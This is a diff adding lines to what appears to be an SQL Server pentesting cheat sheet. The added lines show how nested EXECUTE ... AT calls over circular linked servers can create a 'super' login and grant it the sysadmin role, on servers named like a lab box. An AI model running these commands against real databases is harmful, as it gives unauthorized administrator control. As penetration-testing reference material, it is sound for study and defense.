@@ -444,6 +444,14 @@ GO
 # Run queries on remote server
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [$SERVER_NAME]
 GO
+
+# Check if there are circular links, you can abuse like this:
+# Running on server 1
+EXECUTE('EXECUTE(''select suser_name()'') at [$SERVER1_NAME]') AT [$SERVER2_NAME];
+
+EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''super'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
+
+EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
 ```
 
 - Enumerating SQL server admins in domain:
